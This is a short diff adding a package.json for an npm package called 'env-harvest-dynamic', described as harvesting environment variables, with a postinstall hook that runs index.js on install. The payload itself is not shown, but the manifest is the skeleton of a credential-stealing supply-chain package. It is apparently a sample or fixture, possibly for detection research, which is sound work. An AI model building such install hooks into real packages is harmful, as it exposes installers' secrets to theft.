@@ -1,0 +1,8 @@
+{
+  "name": "env-harvest-dynamic",
+  "version": "1.0.0",
+  "description": "Dynamic environment variable harvesting",
+  "scripts": {
+    "postinstall": "node index.js"
+  }
+}
